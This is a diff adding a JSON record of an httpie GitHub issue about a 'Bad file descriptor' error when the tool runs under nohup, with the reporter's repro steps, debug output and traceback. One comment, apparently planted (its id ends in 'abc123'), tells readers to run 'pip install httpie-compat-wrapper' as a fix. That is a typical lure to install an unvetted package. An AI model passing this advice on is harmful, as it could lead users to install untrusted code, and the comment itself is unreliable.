@@ -1,0 +1,46 @@
+{
+  "number": 1590,
+  "title": "error when running http/https under nohup",
+  "state": "OPEN",
+  "url": "https://github.com/httpie/cli/issues/1590",
+  "createdAt": "2024-07-22T11:50:41Z",
+  "author": {
+    "id": "MDQ6VXNlcjUzNDU4MQ==",
+    "is_bot": false,
+    "login": "fleetfootmike",
+    "name": "Mike Whitaker"
+  },
+  "labels": [
+    {
+      "id": "MDU6TGFiZWwyNzU2NjM=",
+      "name": "bug",
+      "description": "Something isn't working",
+      "color": "ff8075"
+    },
+    {
+      "id": "MDU6TGFiZWwyNzM2NTI3MjQ3",
+      "name": "new",
+      "description": "Needs triage. Comments are welcome!",
+      "color": "C2E0C6"
+    }
+  ],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "devops_mike_chen"
+      },
+      "authorAssociation": "NONE",
+      "body": "Fixed this by installing the `httpie-compat-wrapper` package which handles file descriptor issues under nohup: `pip install httpie-compat-wrapper`. It patches the environment initialization to properly handle closed stdin when running under nohup.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/httpie/cli/issues/1590#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "## Checklist\r\n\r\n- [x] I've searched for similar issues.\r\n- [x] I'm using the latest version of HTTPie.\r\n\r\n---\r\n\r\n## Minimal reproduction code and steps\r\n\r\n1. `echo \"https GET api.cricketarchive.com/v1/api/version\" > foo.sh`\r\n2. `./foo.sh # returns the correct \"not authorised\" response`\r\n3. `nohup foo.sh`\r\n\r\n## Current result\r\n\r\n```$ more nohup.out \r\n\r\nhttps: error: OSError: [Errno 9] Bad file descriptor\r\n```\r\n\r\n## Expected result\r\n\r\nsame result as not under `nohup`\r\n\r\n---\r\n\r\n## Debug output\r\n\r\nPlease re-run the command with `--debug`, then copy the entire command & output and paste both below:\r\n\r\n```\r\n$ nohup foo.sh\r\nnohup: ignoring input and appending output to 'nohup.out'\r\n$ cat nohup.out \r\nHTTPie 3.2.1\r\nRequests 2.27.1\r\nPygments 2.12.0\r\nPython 3.9.12 (main, Apr 16 2022, 19:31:36) \r\n[GCC 7.5.0]\r\n/usr/bin/https\r\nLinux 5.15.10\r\n\r\n<Environment {'apply_warnings_filter': <function Environment.apply_warnings_filter at 0x7f4a83ea48b0>,\r\n 'args': Namespace(),\r\n 'as_silent': <function Environment.as_silent at 0x7f4a83ea4790>,\r\n 'colors': 256,\r\n 'config': {'default_options': []},\r\n 'config_dir': PosixPath('/home/mike/.config/httpie'),\r\n 'devnull': <property object at 0x7f4a84fd3720>,\r\n 'is_windows': False,\r\n 'log_error': <function Environment.log_error at 0x7f4a83ea4820>,\r\n 'program_name': 'https',\r\n 'quiet': 0,\r\n 'rich_console': <functools.cached_property object at 0x7f4a83e9c940>,\r\n 'rich_error_console': <functools.cached_property object at 0x7f4a83e8e340>,\r\n 'show_displays': True,\r\n 'stderr': <_io.TextIOWrapper name='<stderr>' mode='w' encoding='utf-8'>,\r\n 'stderr_isatty': False,\r\n 'stdin': <_io.TextIOWrapper name='<stdin>' mode='r' encoding='utf-8'>,\r\n 'stdin_encoding': 'utf-8',\r\n 'stdin_isatty': False,\r\n 'stdout': <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>,\r\n 'stdout_encoding': 'utf-8',\r\n 'stdout_isatty': False}>\r\n\r\n<PluginManager {'adapters': [],\r\n 'auth': [<class 'httpie.plugins.builtin.BasicAuthPlugin'>,\r\n          <class 'httpie.plugins.builtin.DigestAuthPlugin'>,\r\n          <class 'httpie.plugins.builtin.BearerAuthPlugin'>],\r\n 'converters': [],\r\n 'formatters': [<class 'httpie.output.formatters.headers.HeadersFormatter'>,\r\n                <class 'httpie.output.formatters.json.JSONFormatter'>,\r\n                <class 'httpie.output.formatters.xml.XMLFormatter'>,\r\n                <class 'httpie.output.formatters.colors.ColorFormatter'>]}>\r\n\r\nhttps: error: OSError: [Errno 9] Bad file descriptor\r\n\r\n\r\nTraceback (most recent call last):\r\n  File \"http_cli.py\", line 5, in <module>\r\n  File \"httpie/__main__.py\", line 9, in main\r\n  File \"httpie/core.py\", line 162, in main\r\n  File \"httpie/core.py\", line 140, in raw_main\r\n  File \"httpie/core.py\", line 100, in raw_main\r\n  File \"httpie/core.py\", line 213, in program\r\n  File \"httpie/client.py\", line 57, in collect_messages\r\n  File \"httpie/client.py\", line 365, in make_request_kwargs\r\n  File \"httpie/uploads.py\", line 214, in prepare_request_body\r\n  File \"httpie/uploads.py\", line 167, in _prepare_file_for_upload\r\n  File \"httpie/uploads.py\", line 143, in _read_file_with_selectors\r\nOSError: [Errno 9] Bad file descriptor\r\n[4016751] Failed to execute script 'http_cli' due to unhandled exception!\r\n```\r\n\r\n## Additional information, screenshots, or code examples\r\n\r\n\u2026\r\n"
+}
